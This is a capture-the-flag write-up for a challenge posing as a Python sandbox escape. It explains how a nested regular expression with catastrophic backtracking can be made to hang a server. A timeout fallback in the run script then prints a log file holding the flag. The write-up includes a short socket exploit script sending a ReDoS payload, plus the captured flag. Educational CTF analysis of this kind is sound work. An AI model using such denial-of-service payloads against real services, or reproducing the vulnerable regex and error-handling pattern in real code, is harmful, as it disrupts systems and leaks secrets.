# Wait a minute - Misc CTF Write-up

## Challenge Overview
**Description:** Isn't this just another pyjail?? Tsk tsk tsk... such low-effort work...

At first glance, this challenge masquerades as a typical "pyjail" (Python sandbox escape) challenge where we need to bypass a blacklist to execute arbitrary code. However, digging into the provided source files reveals that the intended solution is actually a **Regular Expression Denial of Service (ReDoS)** attack combined with a flaw in the shell script that runs the server.

## Step 1: Analyzing the Source Code

We are provided with a zip file containing `Dockerfile`, `run.sh`, `server.py`, and a dummy `flag.txt`.

### The Dockerfile
Looking at the `Dockerfile`, there is a very suspicious line during the setup:
```dockerfile
RUN mkdir -p /srv/app/logs && \
    cp /srv/app/*.txt /srv/app/logs/err.log && \
    # ...
```
This command copies `flag.txt` into `/srv/app/logs/err.log`. This means the error log contains our flag!

### The Runner Script (`run.sh`)
The Python script is wrapped in a shell script, `run.sh`, which enforces a timeout:
```bash
#!/bin/sh

TIME_LIMIT=60
# ...
output=$(timeout "$TIME_LIMIT" python server.py "$input" 2>&1)
status=$?

case $status in
    0) echo "$output" ;;
    1) echo "$output" ;;
    *) echo "Internal error (code $status). Report to admin: $(cat logs/err.log)" ;;
esac
```
The script handles exit codes `0` (success) and `1` (general error) normally. However, if the `timeout` command terminates the script (which typically returns exit code `124` for timeout or `137`/`143` for killed signals), it hits the `*)` fallback case.

This fallback case explicitly executes `cat logs/err.log`, which, as we saw in the Dockerfile, is actually `flag.txt`! To get the flag, we just need to make the Python script hang until it times out.

### The Python Server (`server.py`)
In `server.py`, the user input is matched against a regular expression before any blacklist checks or `eval()` occur:
```python
# NOTE: Using *? (lazy quantifier) to prevent catastrophic backtracking
# See: https://www.regular-expressions.info/catastrophic.html
base = f'[{ALPHA}{NUM}{OPS}{QUOTES}{SPACE}{DELIMS}]*?'
group_sq = f'\\[{base}\\]'
group_rd = f'\\({base}\\)'

pattern = re.compile(f'^({base}|{group_sq}|{group_rd})*$')

if not pattern.fullmatch(user_input):
    reject("Invalid characters used")
```
Despite the developer's comment claiming to prevent catastrophic backtracking, the regex `^({base}|{group_sq}|{group_rd})*$` is a textbook example of **ReDoS**. It features nested grouping with multiple overlapping paths that the regex engine can take to evaluate a string.

## Step 2: Exploitation (ReDoS)

If we provide a string that *almost* matches the pattern but fails at the very last character, the Python `re` module's backtracking engine will try every possible permutation of the groups before giving up. This takes exponential time $O(2^n)$.

By providing a long string of valid characters (like `a`) followed by an invalid character (like `!`), we can force the server to hang. A payload length of ~60 characters is more than enough to stall the regex engine for well over the 60-second `TIME_LIMIT`.

**Exploit Script:**
```python
import socket

s = socket.socket()
s.connect(('challs.nusgreyhats.org', 36267))

print(s.recv(1024).decode())

# 60 valid characters 'a' followed by an invalid character '!'
payload = "a" * 60 + "!"
print("Sending payload:", payload)
s.send(payload.encode() + b'\n')

# Wait for the timeout to occur and receive the flag
while True:
    data = s.recv(1024)
    if not data:
        break
    print(data.decode())
```

## Step 3: Getting the Flag

Running the exploit script sends the malicious regex payload to the server. After the 60-second time limit expires, the `timeout` utility kills the Python process, resulting in an abnormal exit code (like `143`).

The `run.sh` script falls through to the catch-all error handler and prints the contents of `err.log`, granting us the flag:

```
Internal error (code 143). Report to admin: grey{9eT_i7_h0w_Y0u_1iv3_1t_10_t0E5_iN_wH3n_We_5t4nDin_0n_Bu5Ine5S}
```
